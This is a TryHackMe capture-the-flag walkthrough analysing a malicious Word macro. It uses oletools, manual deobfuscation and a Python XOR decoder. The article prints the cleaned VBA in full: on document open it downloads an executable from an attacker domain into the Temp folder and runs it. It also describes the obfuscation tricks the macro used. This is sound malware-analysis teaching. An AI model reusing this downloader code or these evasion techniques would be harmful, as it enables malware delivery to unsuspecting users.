# Try Hack Me - Squid Game, attacker 4

This is part 4 of a [5-part series of walkthroughs](../squid-game.md) for Try Hack Me's Squid Game room.

## 1. Identifying macros - oleid, oledump

Following on from the previous attackers, we use [oleid](https://github.com/decalage2/oletools/wiki/oleid) to confirm that sample confirms likely malicious VBA macros : 

```console

```

and [oledump](https://blog.didierstevens.com/programs/oledump-py/) to identify which of the document's streams contain macros :

```console
remnux@remnux:~$ oledump.py attacker4.doc 
...snip...
  6:        41 'Macros/PROJECTwm'
  7: M   17216 'Macros/VBA/ThisDocument'
  8:     10917 'Macros/VBA/_VBA_PROJECT'
...snip...
```

and oledump again to extract the document's only macro from stream 7 (`oledump.py -s 7 -v attacker4.doc`). The result is 283 lines of heavily obfuscated VBA : 

```vb
Public Function Hextostring(ByVal LIfBaRNaq As String) As String
Dim bOYvqTVCQck As String
Dim FNOMR As String
Dim wDhutJNQ As Long
For wDhutJNQ = 1 To Len(LIfBaRNaq) Step 2
If 128918 = 128918 + 1 Then End
If 3786 < 26 Then
If 751819 = 751819 + 1 Then End
If 3264 < 68 Then
...snip...
```

ViperMonkey goes a long way in working out what this code actually does (and in answering the task questions), but where's the fun in that? This is also a nice exercise in manually approaching something that initially looks pretty monstrous, but quickly becomes much more approachable.

## 2. Manual deobfuscation

The code uses four basic techniques to obfuscate what is actually going on :

1. One-liner If ... Then End statements with impossible conditions (e.g. `If 128918 = 128918 + 1 Then End`)
2. Multi-line If ... Then statements with impossible conditions (e.g. `If 3264 < 68 Then`)
3. GoTo statements that jump to a line label on the very next line, effectively doing nothing (e.g. `GoTo zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:zlbrmdtmprviueydvnhzltntlvfofmkntrjatbzfuxavnqxeasqawcqlnddunpozvflosmyvmvfrlwvkcw:`)
4. Random variables names (eg `Dim bOYvqTVCQck As String`)

The first step of manual deobfuscation is simply to delete all the code that does nothing - in this case, the impossible If-statements and the useless GoTo statements. We can then attempt to rename variables if we're confident about what they might be doing. At the end of this process, we've managed to reduce 283 lines to 67 lines. [I've included the cleaned up version of the code](./attacker4clean.vbs), and it is this version that we will use for analysis.

## 3. Manual analysis

Given that this is the only macro discovered in the document, we can safely assume that the entry point is the AutoOpen() subprocess. In this case, AutoOpen immediately calls the "IOWZJGNTSGK" function :

```vb
Sub IOWZJGNTSGK()
    gGHBkj = XORI(Hextostring("1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811"), Hextostring("744F50"))
    ZUWSBYDOTWV gGHBkj, Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hextostring("11371B0A00123918220E001668143516"), Hextostring("4D734243414671"))
End Sub
```

The first line of this function calls two other functions defined in the macro - Hextostring and XORI (these are the original names taken from the obfuscated version). 
After some cursory analysis, we can conclude that Hextostring takes one string argument, breaks it into character pairs, converts the resulting pair into a hexadecimal number, and uses this hexadecimal number as a character code to build an ASCII string (the docs for various VBA builtins - [Asc](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/asc-function), [Mid](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/mid-function), [Val](https://docs.microsoft.com/en-us/office/vba/Language/Reference/User-Interface-Help/val-function), etc. - are useful here). XORI appears to behave as we might expect - it takes two string arguments and XORS them.

To decode the strings used in the code, we can simply rewrite these functions :

```python
def hextostring(hx: str) -> bytes:
    hex_chars = [hx[i:i+2] for i in range(0, len(hx), 2)]
    return b''.join([chr(int(hc, 16)).encode() for hc in hex_chars])

def xor(cipher: bytes, key: bytes) -> None:
    return ''.join([chr(int(b) ^ int(key[i % len(key)])) for i,b in enumerate(cipher)])

cipher = ""  # add ciphertext
key = ""  # add key

print(xor(hextostring(cipher), hextostring(key)))
```

This lets us clean up the IOWZJGNTSGK function even further :

```vb
Sub IOWZJGNTSGK()
    domain = "hxxp://gv-roth.de/js/bin.exe"
    ZUWSBYDOTWV domain, Environ("TEMP") & "\DYIATHUQLCW.exe"
End Sub
```

So the discovered domain and a file location ("Environ("TEMP") resolves to %USER%\AppData\Local\Temp in Windows 10; the "&" operator is used for string concatenation) are passed to the function ZUWSBYDOTWV. Using the same technique of decoding the strings passed to Hextostring and XORI, we can clean up ZUWSBYDOTWV :

```vb
Function ZUWSBYDOTWV(ByVal domain As String, ByVal executableFileLocation As String) As Boolean
    Dim xmlHttpClient As Object, fileHandle As Long, responseBody() As Byte

    Set xmlHttpClient = CreateObject("MSXML2.XMLHTTP")

    xmlHttpClient.Open "GET", domain, False
    xmlHttpClient.Send "gVHBnk"

    responseBody = xmlHttpClient.responseBody

    fileHandle = FreeFile
    Open executableFileLocation For Binary As #fileHandle
    Put #fileHandle, , responseBody
    Close #fileHandle

    Set hBBkbmop6VHJL = CreateObject("Shell.Application"))
    hBBkbmop6VHJL.Open Environ("TEMP") & "\DYIATHUQLCW.exe"

End Function
```

The ZUWSBYDOTWV function begins by initialising a [XmlHttp client](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms759148(v=vs.85)) to handle web requests. It then uses this client to prepares and sends a GET request to the attacker-controlled domain discovered in the IOWZJGNTSGK function. It then writes the body of the response to this request to the same file location discovered in IOWZJGNTSGK(%USER%\AppData\Local\Temp\DYIATHUQLCW.exe) before executing the downloaded executable with a call to "Shell.Application.Open".
